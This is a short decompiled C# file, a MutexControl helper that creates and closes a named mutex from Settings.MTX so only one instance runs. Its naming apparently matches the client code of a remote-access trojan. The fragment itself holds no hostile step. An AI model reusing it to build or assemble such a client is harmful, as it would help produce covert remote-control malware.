using System;
using System.Threading;

namespace Client.Helper
{
	// Token: 0x02000014 RID: 20
	public static class MutexControl
	{
		// Token: 0x0600005E RID: 94 RVA: 0x00004334 File Offset: 0x00002534
		public static bool CreateMutex()
		{
			bool result;
			MutexControl.currentApp = new Mutex(false, Settings.MTX, ref result);
			return result;
		}

		// Token: 0x0600005F RID: 95 RVA: 0x000022E6 File Offset: 0x000004E6
		public static void CloseMutex()
		{
			if (MutexControl.currentApp != null)
			{
				MutexControl.currentApp.Close();
				MutexControl.currentApp = null;
			}
		}

		// Token: 0x04000032 RID: 50
		public static Mutex currentApp;
	}
}
